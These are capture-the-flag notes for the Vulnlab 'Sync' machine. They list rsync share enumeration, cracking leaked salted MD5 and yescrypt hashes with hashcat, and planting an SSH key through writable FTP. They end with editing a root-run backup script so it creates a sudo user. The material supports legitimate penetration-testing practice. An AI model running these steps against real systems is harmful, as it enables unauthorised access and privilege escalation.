## User
* has ftp, http, rsync, ssh
* http is a simple login site
* ftp needs creds
* `rsync -av --list-only rsync://10.10.83.58:873` list shares
* `rsync -av rsync://<target>:873/httpd <output directory>` download files
* index.php of the site leaks how passwords are stored/used
	* `$hash = md5("$secure|$username|$password");`
	* `$secure = "6c4972f3717a5e881e282ad3105de01e";`
	* we have the salt from the secure var
* site db has admin and triss users
	* `admin:7658a2741c9df3a97c819584db6e6b3c`
	* `triss:a0de4d7f81676c3ea9eabcadfd2536f6`
	* need to get in a crackable format for hashcat
* Cracking salted md5 w hashcat
	* format: `hash:salt|user|`
	* `hashcat -m 10 -a 0 hashes wordlist`
	* `triss:gerald`
* can login to the site as triss but not ssh, logs into ftp
* FTP
	* had write access
	* manually added my ssh key as an authorized key to ssh in as triss
* jennifer has the same passwd so we can su to her
![[jennifer-home.png]]
![[triss-dashboard.png]]
## Root
* now as jennifer we see a backups folder in root w zip files
![[backups.png]]
* unzipping them reveals a copy of the shadow file
![[backup-contents.png]]
![[shadow.png]]
* the hash for sa is in a yescrypt format, and decodes to `sa:sakura`
### sa
* w `find / | grep backup` i found the backup.sh file
![[backup-sh-found.png]]
![[backup-script.png]]
* this is evidently what's populating the backups; probably has to be run as root if it can copy etc shadow
![[shadow-perms.png]]
* we can edit the script to make us a new root user
	* `useradd -m -s /bin/bash -G sudo lfgberg && echo 'lfgberg:password1' | chpasswd` will make a new superuser next time the script runs
![[vulnlab/sync/root-flag.png]]